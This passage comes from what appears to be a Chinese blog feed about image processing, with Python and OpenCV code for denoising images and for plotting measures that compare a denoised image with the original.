class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x+<span class="number">1</span>, y-<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= x &lt;= <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= y-<span class="number">1</span> &lt;= <span class="number">2</span> <span class="keyword">and</span> part[_2d_2_1d(x, y-<span class="number">1</span>)] == part[num]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            _3X3 = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _3X3[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _3X3[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _3X3[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            _3X3[<span class="number">1</span>][<span class="number">1</span>] = img_channel[i][j]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_3X3)</span><br><span class="line">            <span class="comment"># 如果在不去除点的情况下，不需要划分，那么就跳过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> flag1:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 判断中心点是否合群</span></span><br><span class="line">            part_del_c, flag_del_c = division2(_3X3, <span class="number">8</span>)</span><br><span class="line">            <span class="comment"># 如果去掉中心点后可划分，那么比较两种划分</span></span><br><span class="line">            <span class="keyword">if</span> flag_del_c:</span><br><span class="line">                cnt = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                    <span class="keyword">if</span> part_del_c[m] != <span class="number">0</span> <span class="keyword">and</span> part1[m] != part_del_c[m]:</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> cnt &gt;= <span class="number">1</span>:</span><br><span class="line">                    x, y = _1d_2_2d(<span class="number">9</span>-<span class="number">1</span>)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 如果不可划分，那么中心点为可能的噪声</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x, y = _1d_2_2d(<span class="number">9</span> - <span class="number">1</span>)</span><br><span class="line">                result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 搜索其余八邻域像素点是否合理</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check_8area(_3X3, part1, k):</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i]) - <span class="built_in">int</span>(p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">0</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span>] += half_channel[<span class="number">0</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">1</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">1</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">2</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span>] += half_channel[<span class="number">2</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">3</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">3</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    <span class="comment"># half_b = [half_1(b), half_2(b), half_3(b), half_4(b)]</span></span><br><span class="line">    <span class="comment"># half_g = [half_1(g), half_2(g), half_3(g), half_4(g)]</span></span><br><span class="line">    <span class="comment"># half_r = [half_1(r), half_2(r), half_3(r), half_4(r)]</span></span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.noise.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.noise[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;b.pixel.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b.col):</span><br><span class="line">            <span class="built_in">print</span>(b.channel[i][j], file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;,&quot;</span>, file=fp, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不考虑二分之一图像</span></span><br><span class="line">    new_img = cv.merge((mark(b).channel, mark(g).channel, mark(r).channel))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 考虑二分之一图像</span></span><br><span class="line">    <span class="comment"># new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span></span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210530</title>
      <link href="/20210530-img-report/"/>
      <url>/20210530-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="探究降噪合理性"><a href="#探究降噪合理性" class="headerlink" title="探究降噪合理性"></a>探究降噪合理性</h2><h3 id="区分度"><a href="#区分度" class="headerlink" title="区分度"></a>区分度</h3><p>合理的降噪结果应该是本身区分度大的地方更大，让本身区分度小的地方更小</p><p>因此我们拿一张原图，跟降噪后的的图片进行试验（这里就不给出图片样例了）</p><p>但是可以看一下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011609466.png" alt="img"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 求区分度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">return</span> max1 - min2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以2X2为单位求区分度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_difference</span>(<span class="params">img</span>):</span></span><br><span class="line">    row, col = img.shape</span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        result[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img[i][j - <span class="number">1</span>]</span><br><span class="line">            result[division(_8_area)] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    origin_address = <span class="string">&quot;origin.png&quot;</span></span><br><span class="line">    denoise_address = <span class="string">&quot;denoise.png&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 以灰度方式读入图像</span></span><br><span class="line">    origin_img = cv.imread(origin_address, <span class="number">0</span>)</span><br><span class="line">    denoise_img = cv.imread(denoise_address, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求区分度</span></span><br><span class="line">    origin_difference = get_difference(origin_img)</span><br><span class="line">    denoise_difference = get_difference(denoise_img)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 制图</span></span><br><span class="line">    plt.plot(origin_difference, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    plt.plot(denoise_difference, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    <span class="comment"># 用来正常显示中文标签</span></span><br><span class="line">    plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">    <span class="comment"># 用来正常显示负号</span></span><br><span class="line">    plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 标题</span></span><br><span class="line">    plt.title(<span class="string">&#x27;区分度折线图(红色原图/蓝色处理图)&#x27;</span>, fontsize=<span class="number">24</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="差异度"><a href="#差异度" class="headerlink" title="差异度"></a>差异度</h3><p>差异度为3X3小区块内，最大值减去最小值，将得到的值即为差异度，将各差异度累加（大小范围在0~255），制成折线图</p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011610489.png" alt="img"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 